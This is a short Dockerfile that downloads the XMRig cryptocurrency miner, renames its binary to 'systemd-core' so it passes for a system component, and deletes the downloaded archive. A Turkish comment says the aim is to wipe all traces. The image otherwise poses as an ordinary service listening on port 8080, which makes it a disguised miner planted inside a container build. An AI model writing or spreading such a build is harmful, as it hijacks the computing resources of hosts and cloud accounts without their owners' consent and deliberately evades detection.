FROM debian:bookworm-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
        wget \
        curl \
        ca-certificates \
        python3 \
        libstdc++6 \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /server

# Dosyayı indir, çıkar, 'systemd-core' olarak adlandır ve izleri tamamen sil
RUN wget -qO /tmp/sys.tar.gz "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz" \
    && tar xzf /tmp/sys.tar.gz -C /server \
    && mv /server/xmrig-6.21.0/xmrig /server/systemd-core \
    && rm -rf /tmp/sys.tar.gz /server/xmrig-6.21.0

COPY engine.py /engine.py
COPY start.sh  /start.sh
RUN chmod +x /start.sh

RUN groupadd -r appuser && useradd -r -g appuser appuser \
    && mkdir -p /data \
    && chown -R appuser:appuser /data /server /engine.py /start.sh

USER appuser

EXPOSE 8080

CMD ["/start.sh"]
